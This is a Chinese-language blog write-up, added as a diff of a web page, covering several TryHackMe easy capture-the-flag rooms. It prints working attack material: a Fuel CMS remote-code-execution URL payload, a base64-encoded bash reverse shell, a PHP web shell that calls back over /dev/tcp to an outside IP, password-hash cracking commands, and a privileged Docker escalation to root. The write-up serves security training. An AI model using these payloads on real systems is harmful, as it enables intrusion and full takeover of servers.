@@ -1,0 +1,377 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_合集1 | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="TryHackMe 合集（一）本合集包含多个 TryHackMe Easy 级别挑战。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_合集1">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_%E5%90%88%E9%9B%861.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="TryHackMe 合集（一）本合集包含多个 TryHackMe Easy 级别挑战。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-14T14:38:51.000Z">
+<meta property="article:modified_time" content="2026-06-03T08:49:44.446Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_%E5%90%88%E9%9B%861.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_合集1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-03 16:49:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_合集1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-14T14:38:51.000Z" title="发表于 2026-05-14 22:38:51">2026-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-03T08:49:44.446Z" title="更新于 2026-06-03 16:49:44">2026-06-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="TryHackMe-合集（一）"><a href="#TryHackMe-合集（一）" class="headerlink" title="TryHackMe 合集（一）"></a>TryHackMe 合集（一）</h1><p>本合集包含多个 TryHackMe Easy 级别挑战。</p>
+<span id="more"></span>
+
+<hr>
+<h2 id="Neighbour"><a href="#Neighbour" class="headerlink" title="Neighbour"></a>Neighbour</h2><blockquote>
+<p>Check out our new cloud service, Authentication Anywhere. Can you find other user’s secrets?</p>
+</blockquote>
+<p>进入靶场，是一个登录页面</p>
+<p>根据提示 <code>ctrl+u</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Neighbour_1.png" alt="登录页面"></p>
+<p>使用 <code>guest/guest</code> 登录，再次 <code>ctrl+u</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Neighbour_2.png" alt="登录后"></p>
+<p>注意到 <code>url</code> 后面的参数是 <code>user=guest</code></p>
+<p>将其改为 <code>admin</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Neighbour_3.png" alt="Admin Flag"></p>
+<hr>
+<h2 id="Anonforce"><a href="#Anonforce" class="headerlink" title="Anonforce"></a>Anonforce</h2><blockquote>
+<p>boot2root machine for FIT and bsides guatemala CTF</p>
+</blockquote>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>扫描端口</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_1.png" alt="端口扫描"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>用 <code>ftp</code> 匿名登录</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_2.png" alt="FTP 登录"></p>
+<p>在 <code>home/melodias</code> 下找到 <code>user.txt</code>，<code>get</code> 下载到本地</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_3.png" alt="User Flag"></p>
+<p>又在 <code>notread</code> 目录下找到两个文件，下载下来</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_4.png" alt="文件列表"></p>
+<p><code>private.asc</code> 是一段 <code>pgp</code> 私钥，<code>backup.pgp</code> 是一段加密字符</p>
+<p>开始破解，得到密码 <code>xbox360</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg2john private.asc &gt; pgp.hash </span><br><span class="line">john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_5.png" alt="密码破解"></p>
+<p>使用密码 <code>xbox360</code> 导入私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --import private.asc  </span><br></pre></td></tr></table></figure>
+
+<p>解密 <code>backup.pgp</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --decrypt backup.pgp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_6.png" alt="解密结果"></p>
+<p>得到了 <code>/etc/shadow</code> 哈希文件，里面有 <code>root</code> 密码哈希</p>
+<blockquote>
+<p>root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5</p>
+</blockquote>
+<p>破解密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --decrypt backup.pgp &gt; shadow </span><br><span class="line">john shadow --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_7.png" alt="密码破解"></p>
+<p>得到密码 <code>hikari</code>，<code>ssh</code> 登录</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Anonforce_8.png" alt="SSH 登录"></p>
+<hr>
+<h2 id="Ignite"><a href="#Ignite" class="headerlink" title="Ignite"></a>Ignite</h2><blockquote>
+<p>A new start-up has a few issues with their web server.</p>
+</blockquote>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用了 <code>Fuel CMS</code>，版本是 <code>1.4</code></p>
+<p>谷歌搜索该版本存在无认证 <code>rce</code> 漏洞 <code>CVE-2018-16763</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_1.png" alt="CMS 识别"></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>验证漏洞</p>
+<p><code>payload</code>：<code>/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27id%27)%2B%27</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_2.png" alt="漏洞验证"></p>
+<p><code>kali</code> 搜索相关漏洞并下载 <code>47138.py</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit <span class="string">&quot;fuel&quot;</span> </span><br><span class="line">searchsploit -m 47138</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_3.png" alt="下载脚本"></p>
+<p>使用 <code>python2</code> 执行，成功反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 47138.py bash -c <span class="string">&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNi4xNjkvNDQ0NCAwPiYxCg==&#125;|&#123;base64,-d&#125;|bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_4.png" alt="反弹成功"></p>
+<p>在 <code>home/www-data</code> 下找到 <code>flag.txt</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_5.png" alt="Flag"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>在网站首页提到了一个数据库文件</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_6.png" alt="数据库文件"></p>
+<p>查看该数据库文件，给了 <code>root</code> 账号的密码</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_7.png" alt="Root 密码"></p>
+<p>使用 <code>script</code> 创建一个伪终端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_9.png" alt="伪终端"></p>
+<p>获取 <code>root.txt</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Ignite_10.png" alt="Root Flag"></p>
+<hr>
+<h2 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h2><blockquote>
+<p>A Rick and Morty CTF. Help turn Rick back into a human!</p>
+</blockquote>
+<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>进入网站，在控制台得到用户名 <code>R1ckRul3s</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_1.png" alt="用户名"></p>
+<p>目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.49.138.14 -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_2.png" alt="目录扫描"></p>
+<p>访问 <code>/robots.txt</code>，只有一串字符串 <code>Wubbalubbadubdub</code>，猜测可能是密码</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_4.png" alt="robots.txt"></p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <code>/login.php</code></p>
+<blockquote>
+<p>用户名：R1ckRul3s<br>密码：Wubbalubbadubdub</p>
+</blockquote>
+<p>成功登录，进去后是一个可以命令执行的输入框</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_6.png" alt="命令执行"></p>
+<p>尝试 <code>cat Sup3rS3cretPickl3Ingred.txt</code>，但是命令被禁止了</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_7.png" alt="命令禁止"></p>
+<p>使用 <code>tac</code> 成功得到第一个 <code>flag</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_8.png" alt="Flag 1"></p>
+<p>查看 <code>clue.txt</code>，显示 <code>Look around the file system for the other ingredient</code></p>
+<p>输入 <code>ls -l /home/rick</code>，查看该文件，成功得到 <code>flag</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_9.png" alt="Flag 2"></p>
+<h3 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h3><p>输入 <code>sudo -l</code>，可以无密码以 <code>root</code> 执行任意命令</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Pickle_Rick_10.png" alt="Sudo"></p>
+<p>输入 <code>sudo tac /root/3rd.txt</code> 得到最后一个 <code>flag</code></p>
+<hr>
+<h2 id="mKingdom"><a href="#mKingdom" class="headerlink" title="mKingdom"></a>mKingdom</h2><blockquote>
+<p>Beginner-friendly box inspired by a certain mustache man.</p>
+</blockquote>
+<h3 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h3><p>扫描端口</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_1.png" alt="端口扫描"></p>
+<p>访问 <code>85</code> 端口，就一个鬼脸</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_2.png" alt="85 端口"></p>
+<p>目录扫描</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_3.png" alt="目录扫描"></p>
+<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <code>/app</code>，使用了 <code>concrete5 cms</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_4.png" alt="CMS"></p>
+<p>登录页面，使用弱密码 <code>admin/password</code> 成功登录</p>
+<p>进入后台，有可进行文件上传的地方</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_6.png" alt="后台"></p>
+<p>设置里面可以设置上传的文件类型，添加上 <code>php</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_7.png" alt="设置"></p>
+<p>上传木马文件</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_8.png" alt="上传"></p>
+<h3 id="权限提升-2"><a href="#权限提升-2" class="headerlink" title="权限提升"></a>权限提升</h3><p>蚁剑连接，知道了 <code>toad</code> 用户的密码</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_10.png" alt="密码"></p>
+<p>上传单文件 PHP shell，使用 <code>python</code> 反弹 <code>shell</code></p>
+<p>使用刚才得到的密码登录 <code>toad</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_11.png" alt="toad 登录"></p>
+<p>执行 <code>env</code> 命令，发现密码字段，base64 解码得到 <code>ikaTeNTANtES</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_14.png" alt="env"></p>
+<p>使用该密码登录 <code>mario</code> 账户</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_15.png" alt="mario 登录"></p>
+<p>修改 <code>hosts</code> 文件，本地创建 <code>counter.sh</code> 写入反弹指令，python 开启 85 端口</p>
+<p>等待一会成功反弹</p>
+<p><img src="/../image/TryHackMe/easy/collection1/mKingdom_19.png" alt="反弹成功"></p>
+<hr>
+<h2 id="Dav"><a href="#Dav" class="headerlink" title="Dav"></a>Dav</h2><blockquote>
+<p>boot2root machine for FIT and bsides guatemala CTF</p>
+</blockquote>
+<h3 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h3><p>扫描端口，只开放了 <code>80</code> 端口，进去是一个阿帕奇默认页面</p>
+<p>使用 <code>gobuister</code> 扫目录，得到目录 <code>/webdav</code></p>
+<p>访问该地址弹出登录框</p>
+<p><code>webdav</code> 是阿帕奇自带的一个模块，使用 <code>wammp/xammp</code> 成功登录</p>
+<h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>创建 <code>shell.php</code>，里面写入反弹指令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.206.169/4444 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>cadaver</code> 连接，然后使用 <code>put</code> 上传后门</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Dav_1.png" alt="上传后门"></p>
+<p>本机监听端口，再去网页端访问 <code>/webdav/shell.php</code></p>
+<p>成功反弹</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Dav_2.png" alt="反弹成功"></p>
+<h3 id="权限提升-3"><a href="#权限提升-3" class="headerlink" title="权限提升"></a>权限提升</h3><p><code>sudo -l</code> 发现可以无密码 <code>root</code> 执行 <code>/bin/cat</code></p>
+<p>那就直接查看 <code>root.txt</code></p>
+<p><img src="/../image/TryHackMe/easy/collection1/Dav_3.png" alt="Root Flag"></p>
+<hr>
+<h2 id="TakeOver"><a href="#TakeOver" class="headerlink" title="TakeOver"></a>TakeOver</h2><blockquote>
+<p>This challenge revolves around subdomain enumeration.</p>
+</blockquote>
+<p>访问网站会重定向到 <code>futurevera.thm</code>，修改 <code>hosts</code> 文件即可</p>
+<p>子域名扫描</p>
+<p><img src="/../image/TryHackMe/easy/collection1/TakeOver_1.png" alt="子域名扫描"></p>
+<p>但是无法访问</p>
+<p>查看证书得到一个新的地址</p>
+<p><img src="/../image/TryHackMe/easy/collection1/TakeOver_2.png" alt="证书信息"></p>
+<p><code>curl</code> 访问，得到 <code>flag</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://secrethelpdesk934752.support.futurevera.thm</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Couch"><a href="#Couch" class="headerlink" title="Couch"></a>Couch</h2><blockquote>
+<p>Hack into a vulnerable database server that collects and stores data in JSON-based document formats.</p>
+</blockquote>
+<h3 id="信息收集-5"><a href="#信息收集-5" class="headerlink" title="信息收集"></a>信息收集</h3><p>端口扫描，其中一个是 <code>couchdb</code> 数据库</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Couch_1.png" alt="端口扫描"></p>
+<p>访问 <code>/_utils</code> 查看 <code>web</code> 管理器</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Couch_3.png" alt="管理器"></p>
+<h3 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <code>/_all_dbs</code> 查看所有数据库</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Couch_4.png" alt="数据库列表"></p>
+<p>在 <code>secret</code> 数据库里面找到一个账号密码</p>
+<blockquote>
+<p>atena<br>t4qfzcc4qN##</p>
+</blockquote>
+<p><img src="/../image/TryHackMe/easy/collection1/Couch_5.png" alt="账号密码"></p>
+<p>使用 <code>ssh</code> 登录</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Couch_6.png" alt="SSH 登录"></p>
+<h3 id="权限提升-4"><a href="#权限提升-4" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看 <code>.bash_history</code>，有一条 <code>docker</code> 命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H 127.0.0.1:2375 run --<span class="built_in">rm</span> -it --privileged --net=host -v /:/mnt alpine</span><br></pre></td></tr></table></figure>
+
+<p>运行该命令得到 <code>root</code> 权限</p>
+<p><img src="/../image/TryHackMe/easy/collection1/Couch_10.png" alt="Root 权限"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_%E5%90%88%E9%9B%861.html">https://x9wd09ncc.github.io/post/TryHackMe_%E5%90%88%E9%9B%861.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_%E5%90%88%E9%9B%862.html" title="TryHackMe_合集2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_合集2</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Bugged.html" title="TryHackMe_Bugged"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Bugged</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Blueprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Blueprint</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break_Out_The_Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break_Out_The_Cage</div></div></a></div><div><a 